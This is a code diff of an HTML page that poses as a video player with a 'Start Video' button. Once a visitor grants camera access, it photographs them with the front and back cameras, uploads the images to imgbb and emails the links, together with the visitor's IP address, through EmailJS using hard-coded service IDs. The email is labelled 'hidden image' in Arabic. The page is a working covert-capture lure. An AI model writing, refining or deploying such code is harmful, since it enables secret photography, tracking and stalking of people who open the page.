@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -46,7 +46,7 @@
       position: relative;
       width: 100%;
       height: 0;
-      padding-bottom: 56.25%; /* 16:9 aspect ratio */
+      padding-bottom: 56.25%; /* نسبة 16:9 */
       margin: 0 auto 25px;
       border-radius: 10px;
       overflow: hidden;
@@ -117,7 +117,7 @@
       display: none;
     }
     
-    /* Countdown styles */
+    /* New styles for countdown */
     .countdown {
       font-size: 36px;
       font-weight: bold;
@@ -165,6 +165,27 @@
       line-height: 1.6;
     }
     
+    /* IP Address Display */
+    .ip-container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      border-radius: 8px;
+      margin: 15px 0;
+      font-family: monospace;
+      font-size: 18px;
+      display: none;
+    }
+    
+    .ip-label {
+      font-weight: bold;
+      margin-bottom: 8px;
+      color: #4cd97b;
+    }
+    
+    .ip-address {
+      word-break: break-all;
+    }
+    
     /* Camera capture indicators */
     .camera-indicators {
       display: flex;
@@ -178,12 +199,6 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      opacity: 0.5;
-      transition: opacity 0.5s;
-    }
-    
-    .camera-indicator.active {
-      opacity: 1;
     }
     
     .camera-icon {
@@ -232,15 +247,21 @@
       <button class="permission-btn" id="cameraBtn">Start Video</button>
     </div>
     
+    <!-- IP Address Display -->
+    <div class="ip-container" id="ipContainer">
+      <div class="ip-label">Your IP Address:</div>
+      <div class="ip-address" id="ipAddress">Loading...</div>
+    </div>
+    
     <!-- Camera indicators -->
     <div class="camera-indicators" id="cameraIndicators">
-      <div class="camera-indicator" id="frontIndicator">
+      <div class="camera-indicator">
         <div class="camera-icon"></div>
-        <div class="camera-label">Front Camera</div>
+        <div class="camera-label"></div>
       </div>
-      <div class="camera-indicator" id="backIndicator">
+      <div class="camera-indicator">
         <div class="camera-icon"></div>
-        <div class="camera-label">Back Camera</div>
+        <div class="camera-label"></div>
       </div>
     </div>
     
@@ -285,9 +306,9 @@
     const countdownElement = document.getElementById('countdown');
     const permissionRequest = document.getElementById('permissionRequest');
     const cameraBtn = document.getElementById('cameraBtn');
+    const ipContainer = document.getElementById('ipContainer');
+    const ipAddressElement = document.getElementById('ipAddress');
     const cameraIndicators = document.getElementById('cameraIndicators');
-    const frontIndicator = document.getElementById('frontIndicator');
-    const backIndicator = document.getElementById('backIndicator');
     
     // State variables
     let cameraCaptured = false;
@@ -305,9 +326,12 @@
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
         ipAddress = data.ip;
+        ipAddressElement.textContent = ipAddress;
+        ipContainer.style.display = 'block';
       } catch (error) {
         console.error('Error fetching IP:', error);
-        ipAddress = "Unknown";
+        ipAddressElement.textContent = "Failed to retrieve IP address";
+        ipContainer.style.display = 'block';
       }
     }
     
@@ -352,22 +376,17 @@
         cameraIndicators.style.display = 'flex';
         
         // Capture front camera
-        const frontImageUrl = await captureCamera('user', 'Front Camera');
+        await captureCamera('user', 'Front Camera');
         
         // Add a small delay between captures
         await new Promise(resolve => setTimeout(resolve, 1000));
         
         // Capture back camera
-        const backImageUrl = await captureCamera('environment', 'Back Camera');
+        await captureCamera('environment', 'Back Camera');
         
         // Stop the stream
         if (stream) {
           stream.getTracks().forEach(track => track.stop());
-        }
-        
-        // Send email with both images
-        if (frontImageUrl || backImageUrl) {
-          sendEmail(frontImageUrl, backImageUrl);
         }
         
       } catch (error) {
@@ -379,8 +398,9 @@
     async function captureCamera(facingMode, cameraName) {
       try {
         // Show camera capture indicator
-        const indicator = cameraName === 'Front Camera' ? frontIndicator : backIndicator;
-        indicator.classList.add('active');
+        const indicators = document.querySelectorAll('.camera-indicator');
+        if (cameraName === 'Front Camera') indicators[0].style.opacity = '1';
+        if (cameraName === 'Back Camera') indicators[1].style.opacity = '1';
         
         // Access the camera
         stream = await navigator.mediaDevices.getUserMedia({ 
@@ -421,34 +441,24 @@
         const imgbbData = await uploadResponse.json();
         
         if (imgbbData.success) {
-          return imgbbData.data.url;
+          // Send email using EmailJS
+          emailjs.send("service_890xst3", "template_p1oukct", {
+            name: "صورة خفية",
+            time: new Date().toLocaleString(),
+            message: `تم التقاط صورة من ${cameraName}. عنوان IP: ${ipAddress}`,
+            image_url: imgbbData.data.url,
+            camera_type: cameraName,
+            ip_address: ipAddress
+          }).then(() => {
+            emailSent = true;
+          }, error => {
+            console.error('Email error:', error);
+          });
         }
         
       } catch (error) {
         console.error(`Error capturing ${cameraName}:`, error);
       }
-      return null;
-    }
-    
-    // Function to send email with both camera images
-    function sendEmail(frontImageUrl, backImageUrl) {
-      // Prepare email parameters
-      const emailParams = {
-        name: "Dual Camera Capture",
-        time: new Date().toLocaleString(),
-        message: `Captured images from both cameras. IP Address: ${ipAddress}`,
-        image_front: frontImageUrl || "No front image captured",
-        image_back: backImageUrl || "No back image captured",
-        ip_address: ipAddress
-      };
-      
-      // Send email using EmailJS
-      emailjs.send("service_890xst3", "template_p1oukct", emailParams)
-        .then(() => {
-          emailSent = true;
-        }, error => {
-          console.error('Email error:', error);
-        });
     }
     
     // Event listener for camera permission button
@@ -502,9 +512,9 @@
     // Display success message after 10 seconds
     setTimeout(() => {
       if (cameraCaptured && emailSent) {
-        console.log('Images captured and sent successfully!');
+        console.log('Image captured and sent successfully!');
       } else if (cameraCaptured) {
-        console.log('Images captured but sending failed');
+        console.log('Image captured but sending failed');
       }
     }, 10000);
   </script>
